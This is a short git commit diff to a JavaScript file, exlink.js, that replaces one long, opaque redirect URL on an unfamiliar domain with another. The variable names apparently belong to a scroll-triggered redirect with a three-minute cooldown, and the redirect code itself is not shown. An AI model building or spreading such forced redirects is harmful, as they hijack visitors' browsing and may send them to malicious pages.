998ccf1f46c85978f71cbe81a75a1e966150f6fd
dexamax <166790203+dexamax@users.noreply.github.com>
2025-05-04 09:02:25 +0530

    Update exlink.js

--- exlink.js
+++ exlink.js
@@ -1,6 +1,6 @@
 (function () {
   let redirected = false;
-  const REDIRECT_URL = "https://vagrejaba.com/bb3.VE0/PO3op_v/bRmuVwJrZaDf0w2kMaTigt3cMsDRMnx/LcT/Y_xAO/DmcpwfMNzsIG";
+  const REDIRECT_URL = "https://vagrejaba.com/bp3MV/0.Pl3mplvmbdmBVAJsZvDF0d2HMQTXg/3/M_DUM/xjL_TUYtxoOgDFc/w/MBzIIp";
   const COOLDOWN_TIME = 3 * 60 * 1000; // 3 minutes in milliseconds
   const STORAGE_KEY = "scrollRedirectTimestamp_" + window.location.pathname;
 
